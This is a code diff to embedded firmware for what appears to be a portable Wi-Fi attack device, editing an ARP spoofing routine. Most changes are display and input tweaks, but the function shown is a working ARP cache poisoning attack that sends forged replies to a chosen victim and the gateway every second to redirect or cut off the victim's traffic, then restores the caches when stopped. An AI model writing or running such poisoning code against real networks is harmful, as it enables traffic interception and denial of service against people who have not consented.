@@ -20,6 +20,7 @@
 
 #include "display_manager.h"
 #include "input_handling.h"
+#include "lockscreen_manager.h"
 #include "network_scanner.h"   // resolveNetTarget()
 
 extern DisplayManager displayManager;
@@ -124,6 +125,12 @@ void runArpSpoof(char* args) {
         gwIp = WiFi.gatewayIP();
     }
 
+    if (victimIp == gwIp || victimIp == WiFi.localIP() || gwIp == WiFi.localIP()) {
+        dm.clearScreen(); dm.setTextColor(TFT_RED);
+        dm.println("Victim must differ from gateway/self.");
+        delay(2000); return;
+    }
+
     struct netif* nif = netif_default;
     uint8_t ourMac[6];
     esp_wifi_get_mac(WIFI_IF_STA, ourMac);
@@ -144,37 +151,39 @@ void runArpSpoof(char* args) {
         dm.setTextColor(TFT_RED); dm.println("Gateway MAC unresolved."); delay(2000); return;
     }
 
-    // ── static screen (drawn once), stats updated in place ────────────────────
-    dm.clearScreen();
-    int y = 40;
-    dm.setTextColor(TFT_RED);    dm.setCursor(10, y); dm.printText("[ARP::SPOOF]  [EXP]"); y += 18;
-    dm.setTextColor(0x7BEF);     dm.setCursor(10, y); dm.printText("redirect/DoS - no forwarding (1 radio)"); y += 18;
-    dm.setTextColor(TFT_WHITE);
-    dm.setCursor(10, y); dm.printText("victim  " + victimIp.toString() + " " + asMacStr(victimMac)); y += 14;
-    dm.setCursor(10, y); dm.printText("gateway " + gwIp.toString() + " " + asMacStr(gwMac)); y += 14;
-    dm.setCursor(10, y); dm.printText("as      " + asMacStr(ourMac)); y += 20;
-    const int statY = y;
-    dm.setCursor(10, y + 20); dm.setTextColor(0x7BEF); dm.printText("[q] stop + heal caches");
+    // ── static screen (redrawn on unlock), stats updated in place ─────────────
+    const int statY = 128;
+    auto drawStatic = [&]() {
+        dm.clearScreen();
+        dm.setTextColor(TFT_RED);   dm.setCursor(10, 40);  dm.printText("[ARP::SPOOF]");
+        dm.setTextColor(0xFD20);    dm.setCursor(118, 40); dm.printText("[EXP]");
+        dm.setTextColor(0x7BEF);    dm.setCursor(10, 58);  dm.printText("redirect/DoS - no forwarding (1 radio)");
+        dm.setTextColor(0xC618);    dm.setCursor(10, 78);  dm.printText("victim  " + victimIp.toString());
+        dm.setCursor(112, 78); dm.printText(asMacStr(victimMac));
+        dm.setCursor(10, 92);  dm.printText("gateway " + gwIp.toString());
+        dm.setCursor(112, 92); dm.printText(asMacStr(gwMac));
+        dm.setTextColor(TFT_WHITE); dm.setCursor(10, 106); dm.printText("as      " + asMacStr(ourMac));
+        dm.setTextColor(0x7BEF);    dm.setCursor(10, 214); dm.printText("[q] stop + heal caches");
+    };
+    drawStatic();
 
     uint32_t pkts = 0, lastTx = 0, lastDraw = 0;
     bool stop = false;
     while (!stop) {
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) drawStatic();
         uint32_t now = millis();
         if (now - lastTx >= 1000) {
             lastTx = now;
-            // victim: "gateway is at us"
-            asSendArpReply(nif, gwIp,     ourMac, victimIp, victimMac);
-            // gateway: "victim is at us"
-            asSendArpReply(nif, victimIp, ourMac, gwIp,     gwMac);
+            asSendArpReply(nif, gwIp,     ourMac, victimIp, victimMac);   // victim: "gateway is us"
+            asSendArpReply(nif, victimIp, ourMac, gwIp,     gwMac);       // gateway: "victim is us"
             pkts += 2;
         }
-        if (now - lastDraw >= 500) {
+        if (now - lastDraw >= 500 && !displayManager.isBlocked()) {
             lastDraw = now;
             dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
-            dm.setCursor(10, statY);
-            dm.setTextColor(TFT_GREEN);
-            char line[40];
-            snprintf(line, sizeof(line), "POISONING  sent %lu", (unsigned long)pkts);
+            dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN);
+            char line[44];
+            snprintf(line, sizeof(line), "POISONING  %lu sent  (2/s)", (unsigned long)pkts);
             dm.printText(line);
         }
         if (inputHandler.getKeyboardInput() == 'q') stop = true;
@@ -189,5 +198,8 @@ void runArpSpoof(char* args) {
         asSendArpReply(nif, victimIp, victimMac, gwIp,     gwMac);       // victim  is at victimMac
         delay(120);
     }
+    dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
+    dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN); dm.printText("healed - caches restored");
+    delay(1000);
     // Leave WiFi initialised + idle (GDMA rule: never WIFI_OFF/disconnect(true)).
 }
